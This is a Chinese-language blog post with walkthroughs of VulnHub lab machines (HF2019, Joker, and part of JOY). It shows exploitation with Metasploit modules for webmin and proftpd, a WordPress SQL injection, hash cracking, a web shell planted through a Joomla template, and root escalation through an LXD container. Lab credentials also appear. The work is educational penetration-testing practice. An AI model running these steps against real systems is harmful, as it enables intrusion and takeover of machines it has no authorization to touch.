@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-120x120.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"w01n.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HF2019-Linux Walkthrough第一步日常先打开靶机 这次是个Debian64位的靶机  还是nmap先确定IP 192.168.0.118   页面先访问一下  可以看到是个wordpress的站   然后日常扫一波端口  看看有没有什么利用点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Walkthrough(二)">
+<meta property="og:url" content="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%BA%8C/index.html">
+<meta property="og:site_name" content="oslo&#39;S Blog">
+<meta property="og:description" content="HF2019-Linux Walkthrough第一步日常先打开靶机 这次是个Debian64位的靶机  还是nmap先确定IP 192.168.0.118   页面先访问一下  可以看到是个wordpress的站   然后日常扫一波端口  看看有没有什么利用点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/joker%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/22.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/JOY%20img/23.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/ReconForce%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/symfonos3%20img/21.png">
+<meta property="article:published_time" content="2020-03-18T08:10:31.000Z">
+<meta property="article:modified_time" content="2020-03-18T08:10:31.000Z">
+<meta property="article:author" content="Oslo">
+<meta property="article:tag" content="VulnHub">
+<meta property="article:tag" content="Walkthrough">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w01n.github.io/images/vulnhub/HF2019%20img/1.png">
+
+<link rel="canonical" href="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%BA%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>VulnHub Walkthrough(二) | oslo'S Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="oslo'S Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">oslo'S Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Self Recording</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">3</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Oslo">
+      <meta itemprop="description" content="You guilty , You died">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="oslo'S Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub Walkthrough(二)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-18 16:10:31" itemprop="dateCreated datePublished" datetime="2020-03-18T16:10:31+08:00">2020-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Walkthrough/" itemprop="url" rel="index"><span itemprop="name">Walkthrough</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HF2019-Linux-Walkthrough"><a href="#HF2019-Linux-Walkthrough" class="headerlink" title="HF2019-Linux Walkthrough"></a>HF2019-Linux Walkthrough</h1><p>第一步日常先打开靶机 这次是个Debian64位的靶机 </p>
+<p>还是nmap先确定IP 192.168.0.118</p>
+<img data-src="/images/vulnhub/HF2019 img/1.png" style="zoom:60%;" />
+
+<p>页面先访问一下  可以看到是个wordpress的站</p>
+<img data-src="/images/vulnhub/HF2019 img/2.png" style="zoom:60%;" />
+
+<p>然后日常扫一波端口  看看有没有什么利用点</p>
+ <a id="more"></a> 
+
+<p>这里可以看到靶机开了ftp匿名登录 也可以看到是wp的站和其他文件</p>
+<img data-src="/images/vulnhub/HF2019 img/3.png" style="zoom:60%;" />
+
+<p>这里还要一个1000端口开着 开了个http服务</p>
+<img data-src="/images/vulnhub/HF2019 img/4.png" style="zoom:60%;" />
+
+<p>先ftp登录一下  ftp登录上去发现只有一堆wp的网站文件 没有其他有用的</p>
+<img data-src="/images/vulnhub/HF2019 img/5.png" style="zoom:60%;" />
+
+<p>再看一下1000端口  是个webmin的登录页面  然后google了一下有没有什么利用点</p>
+<img data-src="/images/vulnhub/HF2019 img/6.png" style="zoom:60%;" />
+
+<p>发现有一篇文章 是webmin的后门msf利用</p>
+<img data-src="/images/vulnhub/HF2019 img/7.png" style="zoom:60%;" />
+
+<p>那就在msf里面跑一边</p>
+<img data-src="/images/vulnhub/HF2019 img/8.png" style="zoom:60%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search webmin</span><br><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.118</span><br><span class="line">set lhost 192.168.0.117</span><br><span class="line">set ssl true</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/HF2019 img/9.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/HF2019 img/10.png" style="zoom:60%;" />
+
+<p>这里就直接获取root</p>
+<p>之后看了其他人的walkthrough 其实wordpres这里应该也有一个点可以获取root</p>
+<p>这里就可以直接用wpscan扫 扫的时候需要一个APIToken 要去wpscan的官网注册免费获取就可以了</p>
+<p>扫描结束后发现有个wp的sql注入可以利用 msf里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;admin&#x2F;http&#x2F;wp_google_maps_sqli</span><br><span class="line">msfconsole</span><br><span class="line">search wp_google_maps</span><br><span class="line">use auxiliary&#x2F;admin&#x2F;http&#x2F;wp_google_maps_sqli</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.110</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后发现有个用户 密码需要使用john来爆破 靶机描述里有 需要rockyou.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1</span><br><span class="line">echo &#39;$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1&#39; &gt; pass.txt</span><br><span class="line">john --wordlist&#x3D;&#x2F;root&#x2F;Desktop&#x2F;rockyou.txt pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码出来是：kittykat1 用户名是:webmaster</p>
+<p>有了用户名和密码  就可以直接用msf里面的wp的exploit来打</p>
+<p>msf里面搜索有关于获取shell的exploit</p>
+<p>这里使用 最后一个 exploit/unix/webapp/wp_admin_shell_upload</p>
+<img data-src="/images/vulnhub/HF2019 img/12.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/HF2019 img/13.png" style="zoom:60%;" />
+
+<p>然后开始提权 先查看sudo权限和可执行文件 这里可以先切换刚才的webmaster用户</p>
+<img data-src="/images/vulnhub/HF2019 img/14.png" style="zoom:60%;" />
+
+<p>然后查看权限</p>
+<img data-src="/images/vulnhub/HF2019 img/15.png" style="zoom:60%;" />
+
+<p>发现权限为ALL</p>
+<p>直接sudo su root</p>
+<img data-src="/images/vulnhub/HF2019 img/16.png" style="zoom:60%;" />
+
+<p>最后就是root权限了</p>
+<p>By oslo(A fake hacker)</p>
+<h1 id="Joker-walkthrough"><a href="#Joker-walkthrough" class="headerlink" title="Joker walkthrough"></a>Joker walkthrough</h1><p>这次是个VMware的靶机 先打开看看</p>
+<img data-src="/images/vulnhub/joker img/1.png" style="zoom:60%;" />
+
+<p>然后打开kali扫一波 看看IP 192.168.0.120和相应的开了的端口</p>
+<img data-src="/images/vulnhub/joker img/2.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/3.png" style="zoom:60%;" />
+
+<p>然后扫一下端口   发现还开了个8080端口 访问发现需要密码登录 等下再看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -T5 -A -p- 192.168.0.120</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/joker img/4.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/5.png" style="zoom:60%;" />
+
+<p>先扫一下目录 发现了有两个等下 一个phpinfo和一个secret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.0.120 -X .php,.txt,.html</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/joker img/6.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/7.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/8.png" style="zoom:60%;" />
+
+<p>这里提示一个rock 应该可以用rockyou.txt来进行爆破</p>
+<p>bp抓包爆破一下  抓包后发现被base64编码了</p>
+<img data-src="/images/vulnhub/joker img/9.png" style="zoom:60%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am9rZXI6MTIzNDY&#x3D;：joker:12346</span><br></pre></td></tr></table></figure>
+
+<p>所以是用户名:密码   字典里面怎么改呢</p>
+<p>注意到刚才txt文件里面提示100  应该是只需要前100就行 先把前100个提取出来 然后前面加上joker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 100 rockyou.txt &gt; dict.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/joker img/10.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/11.png" style="zoom:60%;" />
+
+<p>最后密码是hannah  登录进去发现是个joomla的站</p>
+<p>joomla默认的后台地址一般是 /administrator</p>
+<img data-src="/images/vulnhub/joker img/13.png" style="zoom:60%;" />
+
+<p>google了一下joomla的默认用户名和密码 joomla:joomla</p>
+<p>进去了  然后看了看有什么功能</p>
+<img data-src="/images/vulnhub/joker img/14.png" style="zoom:60%;" />
+
+<p>然后在末模板bezz3里面将index.php的内容改成我们的获取shell的脚本</p>
+<img data-src="/images/vulnhub/joker img/15.png" style="zoom:60%;" />
+
+<p>再次访问主页 然后在kali机监听端口</p>
+<img data-src="/images/vulnhub/joker img/16.png" style="zoom:60%;" />
+
+<p>可以看到这里又有个lxd 后面提权应该也是靠这个 之前做过的一个靶机也是这样</p>
+<p>这里我们直接执行命令 编译build-alpine就行了 然后生成一个镜像 靶机里面下载 然后在容器里面导入然后加载就可提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">.&#x2F;build-alpine</span><br></pre></td></tr></table></figure>
+
+<p>会生成一个tar.gz的文件 下载到靶机 在kali机用python开启http服务</p>
+<img data-src="/images/vulnhub/joker img/17.png" style="zoom:60%;" />
+
+<p>然后导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.11-x86_64-20200212_0116.tar.gz --alias osloimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init osloimage ignite -c security.privileged&#x3D;true</span><br><span class="line">lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/joker img/18.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/19.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/joker img/20.png" style="zoom:60%;" />
+
+<p>By oslo(A fake hacker)</p>
+<h1 id="JOY-vm-Walkthrough"><a href="#JOY-vm-Walkthrough" class="headerlink" title="JOY vm Walkthrough"></a>JOY vm Walkthrough</h1><p>还是先打开靶机 是个Debian64的靶机</p>
+<p>nmap先确定IP 192.168.0.119</p>
+<img data-src="/images/vulnhub/JOY img/1.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/JOY img/3.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/JOY img/4.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/JOY img/2.png" style="zoom:60%;" />
+
+<p>扫端口 可以看到开了很多端口  还是有个匿名登录的ftp端口</p>
+<p>先看一下ftp端口里面有什么东西 直接网页访问就可以了</p>
+<img data-src="/images/vulnhub/JOY img/5.png" style="zoom:60%;" />
+
+<p>只在upload里面发现了有文件 download一点东西都没有</p>
+<img data-src="/images/vulnhub/JOY img/6.png" style="zoom:60%;" />
+
+<p>发现这里面的东西好像就directory有用 下载下来看看  里面是一个目录结构</p>
+<img data-src="/images/vulnhub/JOY img/7.png" style="zoom:60%;" />
+
+<p>有很多名字是字符串的txt文件 应该是没用的 先删了</p>
+<img data-src="/images/vulnhub/JOY img/8.png" style="zoom:60%;" />
+
+<p>其他都是正常的 有个haha和version_control 应该有点东西</p>
+<p>haha的文件大小为0 看看version_control 应该是和版本有关</p>
+<p>它的目录没有特殊的话应该就是/home/patrick/version_control</p>
+<p>怎么下载到本地呢 还是使用连接ftp来下载文件 ftp不能直接切换目录来下载</p>
+<p>扫端口看到21端口是开的 telnet试试 把文件复制到upload目录下 方便ftp下载</p>
+<img data-src="/images/vulnhub/JOY img/9.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/JOY img/10.png" style="zoom:60%;" />
+
+<p>然后查看内容</p>
+<img data-src="/images/vulnhub/JOY img/11.png" style="zoom:60%;" />
+
+<p>快有看到里面的一些版本信息和提示  网站目录放到了/var/www/tryingharderisjoy里面</p>
+<p>然后看到各个版本信息 可以用  searchsploit搜索可以利用的exploit</p>
+<img data-src="/images/vulnhub/JOY img/12.png" style="zoom:60%;" />
+
+<p>这里找到了 proftpd有个RCE可以利用</p>
+<p>试试这个 excellent yes</p>
+<img data-src="/images/vulnhub/JOY img/13.png" style="zoom:200%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search proftpd 1.3.5</span><br><span class="line">use exploit&#x2F;unix&#x2F;ftp&#x2F;proftpd_modcopy_exec</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.107</span><br><span class="line">set sitepath &#x2F;var&#x2F;www&#x2F;tryingharderisjoy</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/JOY img/14.png" style="zoom:60%;" />
+
+<p>在这个目录下有个ossec 进去看看 应该会有很多配置文件</p>
+<img data-src="/images/vulnhub/JOY img/15.png" style="zoom:60%;" />
+
+<p>注意有个patricksecretsofjoy 看看</p>
+<p>嗯？ 直接就出来密码了</p>
+<img data-src="/images/vulnhub/JOY img/16.png" style="zoom:60%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patrick:apollo098765</span><br><span class="line">root:howtheheckdoiknowwhattherootpasswordis</span><br></pre></td></tr></table></figure>
